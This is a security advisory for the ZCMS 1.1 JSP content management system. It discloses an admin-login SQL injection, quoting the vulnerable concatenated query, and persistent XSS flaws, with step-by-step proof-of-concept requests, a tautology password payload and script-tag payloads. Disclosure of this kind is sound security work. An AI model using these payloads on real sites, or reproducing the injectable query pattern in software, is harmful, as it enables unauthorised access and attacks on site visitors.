Vendor:
=============================================
http://zencherry.com/
http://sourceforge.net/projects/zencherrycms



Product:
==================================================
ZCMS_1.1 JavaServer Pages Content Management System



Advisory Information:
==============================
SQL Injection & Persistent XSS



Vulnerability Details:
======================
SQL Injection:
Login to admin area requires a password but is easily bypassed
using classic SQLInjection method because application uses
concatenated user input to construct SQL queries.


ZCMS exploitable admin login code:
==================================
squerry="SELECT COUNT(username) AS usercount FROM "+TABLE_PREFIX+"users
WHERE
status = 0 AND username = &#039;"+username+"&#039; AND password =
&#039;"+request.getParameter("pass") +"&#039; AND type = 1 ;";


So we just supply an Admin password like --->  HELL&#039; OR &#039;2&#039;=&#039;2
which will resolve as true!


SQL Inject XSS Payload:
=======================
We can also inject persisten XSS payload directly to MySQL database
subverting
all character filtering leveraging existing SQLInjection vulnerabilities.


Persistent XSS:
===============

Another persistent XSS vector is here in author field for comments:
http://localhost:8081/ZCMS_1.1/ZCMS_1.1/index.jsp?dir=editpost&p=[page
number]


Exploit code(s):
===============

1) Bypass admin login
---------------------
localhost:8081/ZCMS_1.1/ZCMS_1.1/?dir=login
Enter &#039;admin&#039; for username field
Enter HELL&#039; OR &#039;2&#039;=&#039;2 for the pass field


2) Inject XSS using SQL Injection
---------------------------------
http://localhost:8081/ZCMS_1.1/ZCMS_1.1/?dir=editpost&p=1&title=
"<script>alert(1)</script>
&content=<script>alert(1)</script>&author=<script>alert(1)</script>
SATAN&visibility=1&type=1&comm=0


3) Persistent XSS field
-----------------------
http://localhost:8081/ZCMS_1.1/ZCMS_1.1/index.jsp?dir=editpost&p=[page
number]
Inject <script>alert(666)</script> in author input field.
